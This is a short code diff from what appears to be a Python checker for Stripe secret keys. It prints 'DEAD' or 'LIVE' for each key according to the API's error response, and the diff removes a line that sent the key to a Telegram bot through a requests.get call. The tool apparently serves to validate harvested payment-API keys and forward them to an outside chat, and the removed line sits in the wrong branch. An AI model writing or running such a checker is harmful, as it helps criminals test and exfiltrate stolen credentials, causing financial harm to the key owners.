@@ -17,7 +17,6 @@ def short_key():
 
   if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
     print(f"DEAD > {skkey}")
-    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
 
   else:
     print(f"LIVE > {skkey}")
